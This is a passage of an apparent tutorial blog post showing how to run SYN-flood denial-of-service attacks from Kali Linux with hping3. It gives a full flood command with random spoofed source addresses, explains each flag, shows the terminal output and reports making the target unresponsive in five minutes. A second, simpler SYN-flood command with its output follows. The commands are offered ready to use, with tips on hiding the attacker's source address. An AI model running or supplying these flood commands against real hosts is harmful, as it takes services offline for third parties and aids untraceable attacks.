<h2 style="padding:0px;margin:25px 0px 10px;outline:none;list-style:none;border:0px none;box-sizing:border-box;font-weight:normal;line-height:1em;font-family:Lora, serif;font-size:30px;color:#FF6200;white-space:normal;background-color:#FFFFFF;">
	<span style="padding:0px;margin:0px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#993300;">DoS using hping3 with random source IP</span>
</h2>
<p style="padding:0px;margin-top:0px;margin-bottom:20px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	That’s enough background, I am moving to the attack. You only need to run a single line command as shown below:
</p>
<pre style="padding:1em;margin-top:0px;margin-bottom:1em;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:#333333;font-stretch:normal;line-height:19px;overflow-x:auto;overflow-y:hidden;color:#DFDFDF;clear:both;border-radius:2px;">root@kali:~# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com

HPING www.hping3testsite.com (lo 127.0.0.1): S set, 40 headers + 120 data bytes
hping in flood mode, no replies will be shown

^C
--- www.hping3testsite.com hping statistic ---
1189112 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
root@kali:~#</pre>
<p style="padding:0px;margin-top:0px;margin-bottom:20px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	Let me explain the syntax’s used in this command:
</p>
<ol style="padding:0px;margin:0px 0px 20px 15px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">hping3&nbsp;</code>= Name of the application binary.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">-c 100000</code>&nbsp;= Number of packets to send.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">-d 120</code>&nbsp;= Size of each packet that was sent to target machine.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">-S</code>&nbsp;= I am sending SYN packets only.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">-w 64</code>&nbsp;= TCP window size.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">-p 21</code>&nbsp;= Destination port (21 being FTP port). You can use any port here.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">--flood</code>&nbsp;= Sending packets as fast as possible, without taking care to show incoming replies. Flood mode.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">--rand-source</code>&nbsp;= Using Random Source IP Addresses. You can also use -a or –spoof to hide hostnames. See MAN page below.
	</li>
	<li style="padding:0px;margin:0px 0px 5px;outline:none;list-style:decimal outside;border:0px none;box-sizing:border-box;">
		<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">www.hping3testsite.com</code>&nbsp;= Destination IP address or target machines IP address. You can also use a website name here. In my case resolves to 127.0.0.1 (as entered in&nbsp;<code style="padding:3px;margin:0px 0px 20px;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:url(&quot;font-stretch:normal;font-size:11px;line-height:19px;font-family:&quot;display:inline;overflow-x:visible;overflow-y:hidden;color:#FF0000;">/etc/hosts</code>&nbsp;file)
	</li>
</ol>
<p style="padding:0px;margin-top:0px;margin-bottom:20px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	So how do you know it’s working? In hping3 flood mode, we don’t check replies received (actually you can’t because in this command we’ve used –rand-souce flag which means the source IP address is not yours anymore.)
</p>
<p style="padding:0px;margin-top:0px;margin-bottom:20px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	Took me just 5 minutes to completely make this machines unresponsive (that’s the definition of DoS – Denial of Service).
</p>
<p style="padding:0px;margin-top:0px;margin-bottom:20px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	In short, if this machine was a Web server, it wouldn’t be able to respond to any new connections and even if it could, it would be really really slow.
</p>
<h3 style="padding:0px;margin:25px 0px 10px;outline:none;list-style:none;border:0px none;box-sizing:border-box;font-weight:normal;line-height:1em;font-family:Lora, serif;font-size:24px;color:#FF6200;white-space:normal;background-color:#FFFFFF;">
	<span style="padding:0px;margin:0px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#993300;">Sample command to DoS using hping3 and nping</span>
</h3>
<p style="padding:0px;margin-top:0px;margin-bottom:20px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#333333;font-family:&quot;font-size:13px;white-space:normal;background-color:#FFFFFF;">
	I found this article which I found interesting and useful. I’ve only modified them to work and demonstrate with Kali Linux (as their formatting and syntaxes were broken – I assume on purpose :) ). These are not written by me. Credit goes to&nbsp;<a href="http://insecurety.net/?p=18" target="_blank" style="padding:0px;margin:0px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#3B5998;text-decoration:none;transition:all 0.2s ease-in-out;">Insecurety Research</a>
</p>
<h4 style="padding:0px;margin:25px 0px 10px;outline:none;list-style:none;border:0px none;box-sizing:border-box;font-weight:normal;line-height:1em;font-family:Lora, serif;font-size:18px;color:#FF6200;white-space:normal;background-color:#FFFFFF;">
	<span style="padding:0px;margin:0px;outline:none;list-style:none;border:0px none;box-sizing:border-box;color:#993300;">Simple SYN flood – DoS using HPING3</span>
</h4>
<pre style="padding:1em;margin-top:0px;margin-bottom:1em;outline:none;list-style:none;border-width:1px;border-style:solid;border-color:#E1E1E1 #F0F0F0 #F0F0F0 #E1E1E1;border-image:initial;box-sizing:border-box;direction:ltr;background:#333333;font-stretch:normal;line-height:19px;overflow-x:auto;overflow-y:hidden;color:#DFDFDF;clear:both;border-radius:2px;">root@kali:~# hping3 -S --flood -V www.hping3testsite.com
using lo, addr: 127.0.0.1, MTU: 65536
HPING www.hping3testsite.com (lo 127.0.0.1): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
^C
--- www.hping3testsite.com hping statistic ---
746021 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
root@kali:~# </pre>